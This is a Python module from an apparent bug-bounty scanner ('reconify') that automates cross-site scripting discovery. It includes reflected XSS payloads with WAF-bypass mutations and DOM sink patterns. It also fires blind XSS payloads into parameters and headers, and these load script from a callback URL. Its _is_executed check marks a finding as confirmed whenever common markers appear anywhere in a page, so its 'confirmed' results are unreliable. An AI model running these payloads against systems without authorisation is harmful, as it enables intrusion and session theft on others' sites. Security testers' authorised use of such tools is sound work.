"""
XSS Discovery Module.

Techniques (based on real bug bounty research):
  1. Reflection tester — finds params that reflect input in response
  2. Payload fuzzer — context-aware XSS payloads, WAF-bypass mutations
  3. DOM sink scanner — find dangerous sinks in JS files (postMessage, innerHTML, eval, etc.)
  4. Blind XSS injector — inject interactsh payloads into headers + params
  5. CSP analyser — detect weak/missing CSP headers
  6. CSTI detector — {{ 7*7 }} template injection probes
  7. SVG upload parameter detector
  8. dalfox subprocess wrapper (if installed)
  9. HTTP header reflection (X-Forwarded-For, Referer, User-Agent)
"""
from __future__ import annotations

import asyncio
import re
import shutil
import subprocess
from collections.abc import AsyncIterator
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from reconify.modules.base import BaseModule

# ── XSS Payloads ───────────────────────────────────────────────────────────────

# Context-aware payload set (HTML context, attr context, JS context, polyglots)
PAYLOADS = [
    # Basic reflection probes
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Event handlers
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    # JS context
    '</script><script>alert(1)</script>',
    # SVG
    '<svg onload=alert(1)>',
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # CSTI probes
    '{{7*7}}',
    '${7*7}',
    '<%=7*7%>',
    # mXSS
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
]

# WAF bypass mutations applied to the basic payload
def _mutations(payload: str) -> list[str]:
    b = payload
    return [
        b,
        b.upper(),
        b.replace("<", "%3C").replace(">", "%3E"),
        b.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
        b.replace("alert", "al\x00ert"),
        b.replace("alert", "prompt"),
        b.replace("alert(1)", "confirm(1)"),
        b.replace(" ", "\t"),
    ]

# DOM sinks to look for in JS
DOM_SINKS = [
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'document\.write\s*\(',
    r'document\.writeln\s*\(',
    r'insertAdjacentHTML\s*\(',
    r'eval\s*\(',
    r'setTimeout\s*\([\'"`]',
    r'setInterval\s*\([\'"`]',
    r'location\.href\s*=',
    r'location\.replace\s*\(',
    r'location\.assign\s*\(',
    r'window\.open\s*\(',
    r'\.src\s*=',
    r'\.action\s*=',
    r'postMessage\s*\(',
    r'addEventListener\s*\(\s*[\'"]message[\'"]',
]

# Dangerous sources in JS
DOM_SOURCES = [
    r'location\.search',
    r'location\.hash',
    r'location\.href',
    r'document\.URL',
    r'document\.referrer',
    r'document\.cookie',
    r'window\.name',
    r'postMessage',
]


class XssModule(BaseModule):
    name = "xss"

    async def run(self) -> AsyncIterator[dict]:
        cfg = self.config
        interactsh_url = cfg.get("interactsh_url", "")

        async with httpx.AsyncClient(
            follow_redirects=True, verify=False,
            headers={"User-Agent": "Mozilla/5.0 reconify/0.1"},
            timeout=12,
        ) as client:

            # 1. Load params discovered by params module
            params = await self._load_params()

            # 2. Reflection + payload testing on XSS-classified params
            xss_params = [p for p in params if p.param_type in ("xss", "generic")]
            async for result in self._test_reflection(client, xss_params):
                yield result

            # 3. DOM sink analysis (from saved JS findings)
            async for result in self._dom_sink_scan():
                yield result

            # 4. CSP analysis on live subdomains
            async for result in self._csp_analysis(client):
                yield result

            # 5. HTTP header reflection
            async for result in self._header_reflection(client):
                yield result

            # 6. Blind XSS injection (if interactsh configured)
            if interactsh_url:
                async for result in self._blind_xss(client, xss_params, interactsh_url):
                    yield result

            # 7. dalfox (if installed) on confirmed reflections
            if shutil.which("dalfox"):
                async for result in self._dalfox(xss_params):
                    yield result

    # ── Reflection Tester ──────────────────────────────────────────────────────

    async def _test_reflection(self, client: httpx.AsyncClient, params: list) -> AsyncIterator[dict]:
        sem = asyncio.Semaphore(self.config.get("threads", 20))
        canary = "xssProbe7z9"

        async def test(p) -> list[dict]:
            results = []
            async with sem:
                # First test: does canary reflect?
                url = _inject_param(p.url, p.param, canary)
                try:
                    r = await client.get(url, timeout=10)
                    if canary not in r.text:
                        return []  # param doesn't reflect, skip
                    # Canary reflected — try payloads
                    for payload in PAYLOADS[:6]:  # test first 6 payloads
                        for mutant in _mutations(payload)[:2]:  # 2 mutations each
                            try:
                                r2 = await client.get(
                                    _inject_param(p.url, p.param, mutant), timeout=10
                                )
                                confirmed = mutant in r2.text or _is_executed(mutant, r2.text)
                                if confirmed or canary in r2.text:
                                    results.append({
                                        "type": "xss_finding",
                                        "url": p.url,
                                        "param": p.param,
                                        "payload": mutant,
                                        "finding_type": "reflected",
                                        "evidence": _snippet(r2.text, mutant),
                                        "confirmed": confirmed,
                                        "tool": "reflection_test",
                                    })
                                    if confirmed:
                                        return results  # confirmed XSS, stop testing this param
                            except Exception:
                                pass
                except Exception:
                    pass
            return results

        tasks = [test(p) for p in params]
        for coro in asyncio.as_completed(tasks):
            for result in await coro:
                yield result

    # ── DOM Sink Analysis ──────────────────────────────────────────────────────

    async def _dom_sink_scan(self) -> AsyncIterator[dict]:
        """Scan saved JS file contents for dangerous sinks + sources."""
        try:
            from reconify.core.storage import get_session, JsFinding
            from sqlmodel import select
            with get_session(self.db_path) as s:
                findings = list(s.exec(
                    select(JsFinding)
                    .where(JsFinding.scan_id == self.scan_id)
                    .where(JsFinding.finding_type == "endpoint")
                ).all())
        except Exception:
            return

        seen: set[str] = set()
        for f in findings:
            js_url = f.js_url
            if js_url in seen:
                continue
            seen.add(js_url)
            # Re-fetch the JS file and scan for sinks/sources
            try:
                async with httpx.AsyncClient(verify=False, timeout=10) as c:
                    r = await c.get(js_url)
                    if r.status_code != 200:
                        continue
                    content = r.text
            except Exception:
                continue

            sinks_found = []
            sources_found = []
            for pattern in DOM_SINKS:
                if re.search(pattern, content):
                    sinks_found.append(pattern.split(r'\.')[0].strip(r'\\s*\('))
            for pattern in DOM_SOURCES:
                if re.search(pattern, content):
                    sources_found.append(pattern.split(r'\.')[1].strip())

            if sinks_found:
                yield {
                    "type": "xss_finding",
                    "url": js_url,
                    "param": "",
                    "payload": "",
                    "finding_type": "dom",
                    "evidence": f"Sinks: {', '.join(sinks_found[:5])} | Sources: {', '.join(sources_found[:3])}",
                    "confirmed": False,
                    "tool": "dom_sink_scan",
                }

            # Detect postMessage handlers without origin checks
            if re.search(r"addEventListener\s*\(\s*['\"]message['\"]", content):
                if not re.search(r"event\.origin", content):
                    yield {
                        "type": "xss_finding",
                        "url": js_url,
                        "param": "postMessage",
                        "payload": "",
                        "finding_type": "dom",
                        "evidence": "postMessage listener found WITHOUT event.origin check — likely vulnerable",
                        "confirmed": False,
                        "tool": "dom_sink_scan",
                    }

            # Detect CSTI patterns
            for fw, probe in [("angular", r"ng-app|angular\."), ("vue", r"new Vue|createApp"),
                               ("react", r"React\.createElement|ReactDOM")]:
                if re.search(probe, content):
                    yield {
                        "type": "xss_finding",
                        "url": js_url,
                        "param": "",
                        "payload": "{{7*7}}",
                        "finding_type": "csti",
                        "evidence": f"{fw} framework detected — test template injection",
                        "confirmed": False,
                        "tool": "dom_sink_scan",
                    }

    # ── CSP Analysis ──────────────────────────────────────────────────────────

    async def _csp_analysis(self, client: httpx.AsyncClient) -> AsyncIterator[dict]:
        for scheme in ("https", "http"):
            url = f"{scheme}://{self.target}/"
            try:
                r = await client.head(url, timeout=8)
                csp = r.headers.get("content-security-policy", "")
                issues = []
                if not csp:
                    issues.append("No CSP header — XSS payloads execute without restriction")
                else:
                    if "unsafe-inline" in csp:
                        issues.append("CSP contains 'unsafe-inline' — inline scripts allowed")
                    if "unsafe-eval" in csp:
                        issues.append("CSP contains 'unsafe-eval' — eval() allowed")
                    if "*" in csp:
                        issues.append("CSP uses wildcard (*) — overly permissive")
                    if "report-only" in r.headers.get("content-security-policy-report-only", ""):
                        issues.append("CSP is in report-only mode — not enforced")
                if issues:
                    yield {
                        "type": "xss_finding",
                        "url": url,
                        "param": "CSP",
                        "payload": csp[:200],
                        "finding_type": "header",
                        "evidence": " | ".join(issues),
                        "confirmed": False,
                        "tool": "csp_analysis",
                    }
                break
            except Exception:
                pass

    # ── Header Reflection ──────────────────────────────────────────────────────

    async def _header_reflection(self, client: httpx.AsyncClient) -> AsyncIterator[dict]:
        canary = "Xr9pQzCanary"
        test_headers = {
            "X-Forwarded-For": canary,
            "X-Forwarded-Host": canary,
            "Referer": f"https://{self.target}/{canary}",
            "User-Agent": f"Mozilla/5.0 {canary}",
            "X-Original-URL": f"/{canary}",
        }
        for scheme in ("https", "http"):
            url = f"{scheme}://{self.target}/"
            try:
                for header, value in test_headers.items():
                    r = await client.get(url, headers={header: value}, timeout=8)
                    if canary in r.text:
                        yield {
                            "type": "xss_finding",
                            "url": url,
                            "param": header,
                            "payload": f"{header}: {value}",
                            "finding_type": "header",
                            "evidence": _snippet(r.text, canary),
                            "confirmed": False,
                            "tool": "header_reflection",
                        }
                break
            except Exception:
                pass

    # ── Blind XSS Injection ───────────────────────────────────────────────────

    async def _blind_xss(
        self, client: httpx.AsyncClient, params: list, callback_url: str
    ) -> AsyncIterator[dict]:
        """
        Inject blind XSS payloads that phone home to interactsh/callback URL.
        Fire into params, headers, and common support/feedback forms.
        """
        blind_payloads = [
            f'"><script src="{callback_url}"></script>',
            f"'><script src='{callback_url}'></script>",
            f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback_url}\';document.body.appendChild(s)">',
            f'javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'{ callback_url}\\\';document.body.appendChild(a)\')',
        ]
        # Inject into top params
        sem = asyncio.Semaphore(10)
        for p in params[:30]:
            async with sem:
                for payload in blind_payloads[:2]:
                    try:
                        url = _inject_param(p.url, p.param, payload)
                        await client.get(url, timeout=8)
                        yield {
                            "type": "xss_finding",
                            "url": p.url,
                            "param": p.param,
                            "payload": payload,
                            "finding_type": "blind",
                            "evidence": f"Injected blind XSS — awaiting callback on {callback_url}",
                            "confirmed": False,
                            "tool": "blind_xss",
                        }
                    except Exception:
                        pass

        # Also inject into common form headers
        blind_headers = {
            "User-Agent": blind_payloads[0],
            "Referer": blind_payloads[0],
            "X-Forwarded-For": blind_payloads[0],
        }
        for scheme in ("https", "http"):
            url = f"{scheme}://{self.target}/"
            try:
                await client.get(url, headers=blind_headers, timeout=8)
                yield {
                    "type": "xss_finding",
                    "url": url,
                    "param": "headers",
                    "payload": blind_payloads[0],
                    "finding_type": "blind",
                    "evidence": "Blind XSS injected into User-Agent, Referer, X-Forwarded-For headers",
                    "confirmed": False,
                    "tool": "blind_xss_headers",
                }
                break
            except Exception:
                pass

    # ── dalfox Wrapper ────────────────────────────────────────────────────────

    async def _dalfox(self, params: list) -> AsyncIterator[dict]:
        """Run dalfox on discovered params (subprocess)."""
        # Build URL list for pipe mode
        urls = list({_inject_param(p.url, p.param, "FUZZ") for p in params[:50]})
        if not urls:
            return

        import tempfile, os
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(urls))
            tmpfile = f.name

        try:
            proc = await asyncio.create_subprocess_exec(
                "dalfox", "file", tmpfile, "--silence", "--no-spinner",
                "--format", "json",
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=300)
            import json
            for line in stdout.decode().splitlines():
                try:
                    entry = json.loads(line)
                    yield {
                        "type": "xss_finding",
                        "url": entry.get("data", {}).get("URL", ""),
                        "param": entry.get("data", {}).get("PARAM", ""),
                        "payload": entry.get("data", {}).get("PAYLOAD", ""),
                        "finding_type": "reflected",
                        "evidence": entry.get("data", {}).get("EVIDENCE", ""),
                        "confirmed": True,
                        "tool": "dalfox",
                    }
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            import os
            try:
                os.unlink(tmpfile)
            except Exception:
                pass

    # ── DB helper ─────────────────────────────────────────────────────────────

    async def _load_params(self):
        try:
            from reconify.core.storage import get_session, Parameter
            from sqlmodel import select
            with get_session(self.db_path) as s:
                return list(s.exec(
                    select(Parameter).where(Parameter.scan_id == self.scan_id)
                ).all())
        except Exception:
            return []


# ── Helpers ────────────────────────────────────────────────────────────────────

def _inject_param(base_url: str, param: str, value: str) -> str:
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _snippet(html: str, needle: str, ctx: int = 100) -> str:
    idx = html.find(needle)
    if idx == -1:
        return ""
    start = max(0, idx - ctx)
    end = min(len(html), idx + len(needle) + ctx)
    return html[start:end].strip()


def _is_executed(payload: str, html: str) -> bool:
    """Check if key markers of the payload appear unescaped in the response."""
    markers = ["<script>", "onerror=", "onload=", "alert(", "javascript:"]
    html_lower = html.lower()
    return any(m in html_lower for m in markers)
